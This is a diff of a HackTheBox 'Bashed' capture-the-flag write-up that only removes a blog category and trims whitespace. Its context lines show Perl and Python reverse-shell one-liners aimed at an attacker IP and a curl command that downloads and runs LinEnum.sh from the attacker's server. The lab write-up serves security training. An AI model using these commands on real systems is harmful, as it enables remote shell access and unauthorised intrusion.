@@ -2,7 +2,6 @@
 title: "HackTheBox -- Bashed"
 date: 2020-04-21T05:56:30-04:00
 categories:
-  - blog
   - hack-the-box
 tags:
   - OSCP
@@ -30,7 +29,7 @@ Reason: 999 conn-refused
 PORT   STATE SERVICE REASON  VERSION
 80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
 |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Arrexel's Development Site
@@ -74,7 +73,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-Some of these look pretty interesting. Checked `/uploads` and got a blank page, but opening `/dev` in a browser shows me a directory with two files listed: 
+Some of these look pretty interesting. Checked `/uploads` and got a blank page, but opening `/dev` in a browser shows me a directory with two files listed:
 
 - `phpbash.min.php`
 - `phpbash.php`
@@ -123,7 +122,7 @@ Also nothing. Maybe this one?
  $ perl -e 'use Socket;$i="10.10.14.31";$p=4321;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-Also nothing. Python? 
+Also nothing. Python?
 
 ```bash
 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -184,7 +183,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 And then I run the following command from the shell on the remote machine:
 
 ```bash
-www-data@bashed:/var/www/html/dev$ curl 10.10.14.31:8000/LinEnum.sh -o LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh 
+www-data@bashed:/var/www/html/dev$ curl 10.10.14.31:8000/LinEnum.sh -o LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
 The program 'curl' is currently not installed. To run 'curl' please ask your administrator to install the package 'curl'
 ```
 
